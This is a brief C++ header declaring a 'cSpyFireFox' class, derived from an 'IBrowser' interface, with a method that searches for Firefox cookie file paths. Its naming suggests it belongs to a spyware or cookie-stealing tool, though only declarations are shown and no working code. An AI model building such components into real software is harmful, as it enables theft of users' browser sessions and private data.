#pragma once
#include "IBrowser.h"
class cSpyFireFox : public IBrowser
{
public:
	cSpyFireFox();
	virtual void searchCookies(vector<string> &p_refvtstrCookiesPath);
};